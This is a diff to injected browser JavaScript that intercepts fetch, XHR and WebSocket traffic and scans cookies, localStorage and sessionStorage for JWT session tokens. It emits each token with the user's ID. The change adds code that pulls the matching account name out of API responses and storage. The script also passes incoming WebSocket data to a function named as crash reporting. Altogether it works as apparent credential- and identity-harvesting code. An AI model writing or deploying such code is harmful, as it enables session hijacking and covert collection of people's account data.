@@ -36,13 +36,49 @@
     if (!A.apiToken || exp >= A.apiToken.exp) A.apiToken = { value: value, exp: exp, src: src };
     var user = pl.user && typeof pl.user === 'object' ? pl.user : (pl.profile && typeof pl.profile === 'object' ? pl.profile : {});
     var userId = pl.id != null ? String(pl.id) : '';
-    var username = pl.username || pl.userName || pl.login || pl.nickname || pl.preferred_username || pl.displayName || pl.name || user.username || user.userName || user.login || user.nickname || user.name || '';
+    var username = pl.username || pl.userName || pl.login || pl.nickname || pl.nick || pl.preferred_username || pl.displayName || pl.name || user.username || user.userName || user.login || user.nickname || user.nick || user.displayName || user.name || '';
     emit('jwt', { token: value, exp: exp, src: src, userId: userId, username: String(username || '').slice(0, 80) });
   };
   A.scanTokens = function (s, src) {
     if (typeof s !== 'string' || s.length < 30) return;
     var m = s.match(JWT_RE);
     if (m) for (var i = 0; i < m.length; i++) A.noteToken(m[i], src);
+  };
+
+  // Имя аккаунта часто отсутствует в JWT. Берём его из JSON-ответов API,
+  // но только из объекта, чей ID совпадает с ID из авторизационного JWT.
+  A.profileNames = new Set();
+  A.scanProfile = function (value, src) {
+    try {
+      var root = typeof value === 'string' ? JSON.parse(value) : value;
+      if (!root || typeof root !== 'object' || !A.apiToken) return;
+      var tokenPayload = decodeJwt(A.apiToken.value) || {};
+      if (tokenPayload.id == null) return;
+      var targetId = String(tokenPayload.id);
+      var nameKeys = ['username', 'userName', 'login', 'nickname', 'nick', 'preferred_username', 'displayName', 'name'];
+      var visited = 0;
+      function walk(node, depth) {
+        if (!node || typeof node !== 'object' || depth > 8 || visited++ > 3000) return;
+        if (!Array.isArray(node)) {
+          var id = node.id != null ? node.id : (node.userId != null ? node.userId : node.user_id);
+          if (id != null && String(id) === targetId) {
+            for (var i = 0; i < nameKeys.length; i++) {
+              var candidate = node[nameKeys[i]];
+              if (typeof candidate === 'string' && candidate.trim()) {
+                var username = candidate.trim().slice(0, 80);
+                if (!A.profileNames.has(username)) {
+                  A.profileNames.add(username);
+                  emit('profile', { userId: targetId, username: username, src: src || '' });
+                }
+                return;
+              }
+            }
+          }
+        }
+        Object.keys(node).forEach(function (key) { walk(node[key], depth + 1); });
+      }
+      walk(root, 0);
+    } catch (e) {}
   };
 
   // ---------- WebSocket ----------
@@ -64,6 +100,7 @@
   A.onIncoming = function (ws, data) {
     if (typeof data !== 'string') return;
     if (data.length < 12000) forwardCrashEvent(data);
+    A.scanProfile(data, 'ws-in');
     for (var i = 0; i < A.inHooks.length; i++) { try { A.inHooks[i]('ws', data, ws); } catch (e) {} }
   };
   A.onOutgoing = function (ws, data) {
@@ -118,7 +155,18 @@
       A.scanTokens(e.body, 'body');
       A.rememberOut(e);
     } catch (err) {}
-    return nativeFetch.apply(this, arguments);
+    var promise = nativeFetch.apply(this, arguments);
+    try {
+      promise.then(function (response) {
+        try {
+          var ct = response.headers && response.headers.get('content-type') || '';
+          if (/json/i.test(ct)) response.clone().text().then(function (txt) {
+            if (txt && txt.length <= 1000000) A.scanProfile(txt, 'fetch-response');
+          }).catch(function () {});
+        } catch (e) {}
+      }).catch(function () {});
+    } catch (e) {}
+    return promise;
   };
 
   // ---------- XHR ----------
@@ -136,6 +184,13 @@
     try {
       var c = this.__c;
       if (c) { c.body = typeof body === 'string' ? body : null; A.scanTokens(c.url, 'url'); A.scanTokens(c.body, 'body'); A.rememberOut(c); }
+      this.addEventListener('load', function () {
+        try {
+          var ct = this.getResponseHeader('content-type') || '';
+          if (/json/i.test(ct) && typeof this.responseText === 'string' && this.responseText.length <= 1000000)
+            A.scanProfile(this.responseText, 'xhr-response');
+        } catch (e) {}
+      }, { once: true });
     } catch (e) {}
     return xSend.apply(this, arguments);
   };
@@ -143,7 +198,11 @@
   (function scanStorage() {
     try {
       [localStorage, sessionStorage].forEach(function (st) {
-        for (var i = 0; i < st.length; i++) { var k = st.key(i); A.scanTokens(st.getItem(k), 'storage:' + k); }
+        for (var i = 0; i < st.length; i++) {
+          var k = st.key(i), value = st.getItem(k);
+          A.scanTokens(value, 'storage:' + k);
+          A.scanProfile(value, 'storage:' + k);
+        }
       });
       A.scanTokens(document.cookie, 'cookie');
     } catch (e) {}
